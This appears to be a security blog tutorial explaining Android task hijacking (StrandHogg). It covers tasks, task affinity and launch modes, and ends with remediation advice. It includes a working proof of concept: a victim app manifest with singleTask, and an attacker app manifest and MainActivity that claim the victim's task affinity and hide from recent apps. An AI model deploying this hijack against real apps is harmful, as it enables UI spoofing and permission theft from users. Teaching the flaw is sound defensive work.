## A deep dive into Task Hijacking in Android

## Introduction

Task Hijacking is a vulnerability that affects the applications running on Android devices due to a misconfiguration in their `AndroidManifest.xml` with their Task Control features.   
This allows attackers/malware to takeover legitimate apps and steal user's data and carry out a range of attacks like

- They can listen to the user through the microphone
- Take photos through the camera
- Read and send SMS messages
- Make and/or record phone conversations, etc. You get the idea. 

This is also dubbed as [StrandHogg](https://promon.co/security-news/strandhogg/) by the Promon Security researchers but the initial research paper was presented at [USENIX](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf) in 2015.

* * *

### Task, Back Stack and Foreground Activities

A task is a collection of activities that users interact with when performing a certain job. The activities are arranged in a stack—the _back stack_)—in the order in which each activity is opened.

The activity that is displayed on the screen is called a foreground activity and its task is called the foreground task. At a time, only one foreground task is visible on the screen. This explanation video by Android explains the concept pretty well

<figure class="kg-card kg-embed-card"><iframe width="740" height="400" src="https://www.youtube.com/embed/MvIlVsXxXmY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></figure>

This visualization from Android helps in explaining how different tasks work when they're put to the foreground or removed from the back stack. This is using Back Stack and as the name suggests it's a type of Stack Data Structure with the LIFO order.

<figure class="kg-card kg-image-card"><img src="https://res-3.cloudinary.com/hadrbwkqj/image/upload/q_auto/v1/ghost-blog-images/tasks.png" class="kg-image" alt loading="lazy"></figure>
- There's only Activity 1 in the foreground. 
- Activity 2 is started which pushes Activity 1 to the Back Stack. Now Activity 2 is in the foreground.
- Activity 3 is started which pushes both Activity 1 and 2 to the Back Stack.
- Now when Activity 3 is closed. The previous activity i.e., 2 is brought automatically to the foreground. This is how task navigation works in Android.

According to the Android security model, all the apps running on the device will be isolated and sandboxed from one another but this is not the case when it comes to the Tasks.   
Android allows Activities from different apps to co-reside in the same Task and this is the root cause of the vulnerability.

* * *

### Launch Modes and Task Affinity

**Task affinity** is an attribute that is defined in each `<activity>` tag in the `AndroidManifest.xml` file. It describes which Task an Activity prefers to join.   
By default, every activity has the same affinity as the **package** name.

We'll be using this when creating our PoC app.

    <activity android:taskAffinity=""/>

**Launch modes** allow you to define how a new instance of an activity is associated with the current task. The [`launchMode`](https://developer.android.com/guide/topics/manifest/activity-element#lmode) attribute specifies an instruction on how the activity should be launched into a task.  
There are four different Launch Modes:

1. standard
2. singleTop
3. singleTask
4. singleInstance

When identifying if Task Hijacking exists in an app, we'll be looking for this flag in the Manifest files of the applications. The attack described below is possible because of the usage of mode " **singleTask**" in the launchMode of an activity.

> You can read more about them in detail here 
> - [https://developer.android.com/guide/components/activities/tasks-and-back-stack](https://developer.android.com/guide/components/activities/tasks-and-back-stack)

When the launchMode is set to `singleTask`, the Android system evaluates three possibilities and one of them is the reason why our attack is possible. Here they are -

- If the Activity instance already exists:   
Android resumes the existing instance instead of creating a new one. It means that there is at most one activity instance in the system under this mode.
- If creating a new activity instance is necessary:   
The Activity Manager Service (AMS) selects a task to host the newly created instance by finding a “ **matching** ” one in all existing tasks. An activity “matches” a task if they have the same task affinity. This is the reason why we can specify the same task affinity as the vulnerable app in our malware/attacker's app so it launches in their task instead of creating it's own. 
- Without finding a “matching” task:  
The AMS creates a new task and makes the new activity instance the root activity of the newly created task.

* * *

### Proof of Concept

Below PoC code has been taken from the original article and case study from [TakeMyHand's Security Blog](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html). Kudos to him for introducing me to the concept of Task Hijacking.

Let's first create a vulnerable victim's application. Fire up the Android studio with an Empty activity. A complete source code can be found in my [Github repository](https://github.com/az0mb13/Task_Hijacking_Strandhogg).


The `AndroidManifest.xml` of victim's app (Super Secure App) is shown below.

    <?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.zombie.ssa">
    
        <application
            android:allowBackup="true"
            android:icon="@mipmap/ic_launcher"
            android:logo="@mipmap/ic_launcher"
            android:label="@string/app_name"
            android:roundIcon="@mipmap/ic_launcher_round"
            android:supportsRtl="true"
            android:theme="@style/Theme.SuperSecureApp">
            <activity android:name=".LoggedIn"></activity>
            <activity android:name=".MainActivity" android:launchMode="singleTask">
    
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />
    
                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
        </application>
    </manifest>

Note the line with **`android:launchMode="singleTask"`.** This is where the vulnerability exists.

Now let's see the PoC for the Attacker's app. This is the `AndroidManifest.xml`.

    <?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        package="com.zombie.attackerapp"
        tools:ignore="ExtraText">
        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
        <application
            android:allowBackup="true"
            android:icon="@mipmap/ic_launcher"
            android:label="@string/app_name"
            android:roundIcon="@mipmap/ic_launcher_round"
            android:supportsRtl="true"
            android:theme="@style/Theme.AttackerApp"
            android:taskAffinity="com.zombie.ssa">
            <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">
    
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />
    
                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
        </application>
    </manifest>

Here, since we want to target our Super secure app, we'll define the task affinity using it's package name - `android:taskAffinity="com.zombie.ssa"`

Another flag `android:excludeFromRecents` ensures the task is not listed in the recent apps, therefore, hiding the attacker's app.

Attacker's `MainActivity.java` can be seen below

    package com.zombie.attackerapp;
    
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    
    import android.Manifest;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.os.Build;
    import android.os.Bundle;
    import android.view.View;
    import android.widget.EditText;
    import android.widget.TextView;
    
    import com.google.android.material.snackbar.Snackbar;
    
    public class MainActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            moveTaskToBack(true);
        }
    
        @Override
        public void onResume(){
            super.onResume();
            setContentView(R.layout.activity_main);
        }
    }

`moveTaskToBack(true)` is being used to move the task containing this activity to the back of the activity stack.

When all of this is combined and installed on a device, here's how the attack works.

<figure class="kg-card kg-embed-card"><iframe width="740" height="400" src="https://www.youtube.com/embed/RNYJ5FyZh5c?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></figure>
- It can be seen that when the Super Secure App is opened normally, it runs in its own task.
- When I open the Attacker app, nothing happens on the foreground but the app opens and minimizes itself hiding from recent apps due to the flags defined above.
- Now when the Super secure app is opened again, it can be seen that the Attacker's app hijacks the task of Super Secure App. 

This is just a simple demonstration but the consequences can range from a simple UI Spoofing attack to permission harvesting as done by the [Promon Security Team](https://www.youtube.com/watch?v=OyFQARwxAE4) which will make it look like the real app is requesting permissions but in actuality, the malware will be using them to exploit further.

* * *

## Remediation

- Set the launchMode to **singleInstance** which will prevent other activities from becoming a part of it's task.
- An additional boolean attribute can be introduced for each app to decide if it allows the activities from other apps to have the same affinity as the app 

* * *

> References
> 
> - [TakeMyHand's Security Blog](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
> - [Promon Security Team](https://promon.co/security-news/strandhogg/)
> - [Google - Tasks and back Stack](https://developer.android.com/guide/components/activities/tasks-and-back-stack)
> - [Usenix Paper](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf)

